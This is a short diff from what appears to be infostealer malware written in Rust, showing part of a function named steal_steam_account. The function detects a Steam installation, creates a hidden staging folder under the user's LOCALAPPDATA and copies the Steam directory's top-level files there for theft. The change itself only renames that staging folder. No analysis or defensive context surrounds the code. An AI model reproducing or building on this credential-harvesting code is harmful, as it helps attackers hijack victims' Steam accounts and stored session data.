@@ -12,7 +12,7 @@ pub fn steal_steam_account() -> Option<String> {
 
 
     if std::path::Path::new("C:\\Program Files (x86)\\Steam\\").exists() {
-        std::fs::create_dir(format!("{}\\logsxc\\steam\\", &std::env::var("LOCALAPPDATA").unwrap())).unwrap();
+        std::fs::create_dir(format!("{}\\logscx\\steam\\", &std::env::var("LOCALAPPDATA").unwrap())).unwrap();
 
 
       for entry in WalkDir::new("C:\\Program Files (x86)\\Steam\\").max_depth(1).into_iter().filter_map(|f| f.ok()) {
@@ -23,7 +23,7 @@ pub fn steal_steam_account() -> Option<String> {
             }
 
             
-            std::fs::copy(entry.path(), &format!("{}\\logsxc\\steam\\{}", &std::env::var("LOCALAPPDATA").unwrap(), entry.file_name().to_str().unwrap())).ok()?; // Copy Steam shit
+            std::fs::copy(entry.path(), &format!("{}\\logscx\\steam\\{}", &std::env::var("LOCALAPPDATA").unwrap(), entry.file_name().to_str().unwrap())).ok()?; // Copy Steam shit
         }
 
 
